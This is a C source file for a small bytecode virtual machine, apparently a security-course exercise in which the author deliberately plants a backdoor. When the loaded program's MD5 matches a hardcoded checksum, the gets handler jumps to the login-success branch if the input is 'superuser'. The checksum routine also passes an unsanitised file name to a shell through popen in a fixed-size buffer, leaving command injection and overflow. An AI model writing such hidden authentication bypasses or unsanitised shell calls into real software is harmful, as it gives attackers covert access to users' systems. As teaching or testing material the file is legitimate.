// This is where you put your VM code.
// I am trying to follow the coding style of the original.

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <assert.h>
#include <string.h>
#include <ctype.h>
#include "minivm.h"

#define NUM_REGS   (256)
#define NUM_FUNCS  (256)
#define PATH_MAX   (256)
#define MD5_LEN    (32)

#define MY_PRGRAM_CHECKSUM "83d18f9c68d08e38b7e57347cfea52b3"

// Global variable that indicates if the process is running.
static bool is_running = true;
uint8_t *heap = NULL;
bool is_login_process = false;
bool is_my_program = false;

void check_addr_range(uint32_t addr) {
    if (addr >= 8192) {
        perror("addr is out of range");
        exit(1);
    }
}

uint8_t read_mem(struct VMContext* ctx, uint32_t addr) {
    check_addr_range(addr);
    return *(ctx->heap + addr);
}

void write_mem(struct VMContext* ctx, uint32_t addr, uint8_t val) {
    check_addr_range(addr);
    *(ctx->heap + addr) = val;
}

// Implement Opcode function
void mini_halt(__attribute__((unused)) struct VMContext* ctx,
               __attribute__((unused)) const uint32_t instr)
{
    is_running = false;
}

void mini_load(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t r1 = EXTRACT_B2(instr);
    const uint32_t addr = ctx->r[r1].value;
    ctx->r[r0].value = read_mem(ctx, addr);
}

void mini_store(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t r1 = EXTRACT_B2(instr);
    const uint32_t addr = ctx->r[r0].value;
    write_mem(ctx, addr, EXTRACT_B0(ctx->r[r1].value));
}

void mini_move(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t r1 = EXTRACT_B2(instr);
    ctx->r[r0].value = ctx->r[r1].value;
}

void mini_puti(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t imm = EXTRACT_B2(instr);
    ctx->r[r0].value = 0x000000ff & imm;
}

void mini_add(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t r1 = EXTRACT_B2(instr);
    const uint8_t r2 = EXTRACT_B3(instr);
    ctx->r[r0].value = ctx->r[r1].value + ctx->r[r2].value;
}

void mini_sub(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t r1 = EXTRACT_B2(instr);
    const uint8_t r2 = EXTRACT_B3(instr);
    ctx->r[r0].value = ctx->r[r1].value - ctx->r[r2].value;
}

void mini_gt(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t r1 = EXTRACT_B2(instr);
    const uint8_t r2 = EXTRACT_B3(instr);
    if (ctx->r[r1].value > ctx->r[r2].value)
        ctx->r[r0].value = 1;
    else
        ctx->r[r0].value = 0;
}

void mini_ge(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t r1 = EXTRACT_B2(instr);
    const uint8_t r2 = EXTRACT_B3(instr);
    if (ctx->r[r1].value >= ctx->r[r2].value)
        ctx->r[r0].value = 1;
    else
        ctx->r[r0].value = 0;
}

void mini_eq(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t r1 = EXTRACT_B2(instr);
    const uint8_t r2 = EXTRACT_B3(instr);
    if (ctx->r[r1].value == ctx->r[r2].value)
        ctx->r[r0].value = 1;
    else
        ctx->r[r0].value = 0;
}

void mini_ite(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint8_t imm1 = EXTRACT_B2(instr);
    const uint8_t imm2 = EXTRACT_B3(instr);
    if (ctx->r[r0].value > 0)
        ctx->pc = imm1;
    else
        ctx->pc = imm2;
}

void mini_jump(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t imm = EXTRACT_B1(instr);
    ctx->pc = imm;
}

void mini_puts(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint32_t addr = ctx->r[r0].value;
    uint32_t pos = addr;
    uint8_t val;
    while(true) {
        val = read_mem(ctx, pos);
        if (val) {
            putchar(val);
            pos++;
        }
        else
            break;
    }
    if (is_my_program && (memcmp(ctx->heap + addr, "User: ", 6) == 0)) {
        is_login_process = true;
    }
}

void mini_gets(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t r0 = EXTRACT_B1(instr);
    const uint32_t addr = ctx->r[r0].value;
    uint32_t pos = addr;
    uint8_t val;
    while(true) {
        val = (uint8_t) getchar();
        if (val == '\n') break;
        write_mem(ctx, pos, val);
        pos++;
    }
    write_mem(ctx, pos, '\0');
    if (is_my_program && is_login_process &&
        memcmp(ctx->heap + addr, "superuser\0", 7) == 0)
    {
        ctx->pc = 3; // Success flow in my login program.
    }
}

void usageExit() {
    printf("[*]Usage: interpreter <bytecode>\n");
    exit(1);
}

void initFuncs(FunPtr *f, uint32_t cnt) {
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        f[i] = NULL;
    }

    f[0x00] = mini_halt;
    f[0x10] = mini_load;
    f[0x20] = mini_store;
    f[0x30] = mini_move;
    f[0x40] = mini_puti;
    f[0x50] = mini_add;
    f[0x60] = mini_sub;
    f[0x70] = mini_gt;
    f[0x80] = mini_ge;
    f[0x90] = mini_eq;
    f[0xa0] = mini_ite;
    f[0xb0] = mini_jump;
    f[0xc0] = mini_puts;
    f[0xd0] = mini_gets;
}

void initRegs(Reg *r, uint32_t cnt)
{
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        r[i].type = 0;
        r[i].value = 0;
    }
}

uint32_t* read_bytecode(const char* filename) {
    FILE* fp;
    fp = fopen(filename, "rb");
    assert(fp != NULL);

    fseek(fp, 0, SEEK_END);
    uint32_t sz = ftell(fp);
    rewind(fp);

    uint32_t *bytecode = (uint32_t*) malloc(sz);
    assert(bytecode != NULL);
    assert(fread(bytecode, 1, sz, fp) == sz);

    fclose(fp);
    return bytecode;
}

int cal_MD5(const char* filename, char *md5_sum) {
    char cmd[PATH_MAX];
    sprintf(cmd, "md5sum %s 2>/dev/null", filename);

    FILE *p = popen(cmd, "r");
    if (p == NULL) return 0;

    int i, ch;
    for (i = 0; i < MD5_LEN && isxdigit(ch = fgetc(p)); i++) {
        *md5_sum++ = ch;
    }

    *md5_sum = '\0';
    pclose(p);
    return i == MD5_LEN;
}

void detect_my_program(const char* filename) {
    char md5[MD5_LEN + 1];
    assert(cal_MD5(filename, md5) != 0);
    if (strncmp(md5, MY_PRGRAM_CHECKSUM, MD5_LEN) == 0)
        is_my_program = true;
}

int main(int argc, char** argv) {
    VMContext vm;
    Reg r[NUM_REGS];
    FunPtr f[NUM_FUNCS];

    // There should be at least one argument.
    if (argc < 2) usageExit();

    // Check if input bytecode is my program for the backdoor
    detect_my_program(argv[1]);

    // Initialize registers.
    initRegs(r, NUM_REGS);
    // Initialize interpretation functions.
    initFuncs(f, NUM_FUNCS);
    // Initialize VM context.
    initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f, read_bytecode(argv[1]));

    while (is_running) {
        stepVMContext(&vm);
    }

    // Zero indicates normal termination.
    return 0;
}
